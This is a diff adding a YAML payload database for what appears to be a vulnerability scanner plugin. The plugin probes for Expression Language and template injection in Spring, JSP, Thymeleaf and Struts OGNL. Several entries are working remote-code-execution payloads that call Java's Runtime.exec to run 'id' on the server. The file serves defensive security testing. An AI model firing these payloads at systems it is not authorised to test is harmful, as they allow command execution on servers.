@@ -1,0 +1,88 @@
+# EL Injection Payloads Database
+# Plugin: core.injection.el_injection
+
+plugin_id: core.injection.el_injection
+mutation_type: field_injection
+payload_type: el_injection
+
+variants:
+  # Variant 1: Spring EL basic
+  - id: spring_el_basic
+    payloads:
+      - "${7*7}"
+      - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+      - "${applicationScope}"
+    expected_result: "49"
+    tech_stack: [java, spring]
+    confidence_boost: 0.25
+    detection: body_contains(expected_result) OR body_matches_any(uid=, gid=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: JSP EL
+  - id: jsp_el
+    payloads:
+      - "${param.test}"
+      - "${header.host}"
+      - "${sessionScope}"
+    tech_stack: [java, jsp]
+    confidence_boost: 0.18
+    detection: body_contains(reflected value)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Thymeleaf
+  - id: thymeleaf_el
+    payloads:
+      - "*{7*7}"
+      - "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+    expected_result: "49"
+    tech_stack: [java, spring, thymeleaf]
+    confidence_boost: 0.22
+    detection: body_contains(expected_result) OR body_matches_any(uid=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 4: Struts OGNL
+  - id: struts_ognl
+    payloads:
+      - "%{7*7}"
+      - "%{#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}"
+    expected_result: "49"
+    tech_stack: [java, struts]
+    confidence_boost: 0.28
+    detection: body_contains(expected_result) OR body_matches_any(uid=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - expression
+  - el
+  - eval
+  - template
+  - view
+  - render
+
+expected_results:
+  spring_el_basic:
+    indicator: template_eval OR rce
+    expected_output: "49"
+  thymeleaf_el:
+    indicator: template_eval OR rce
+    expected_output: "49"
+  struts_ognl:
+    indicator: template_eval OR rce
+    expected_output: "49"
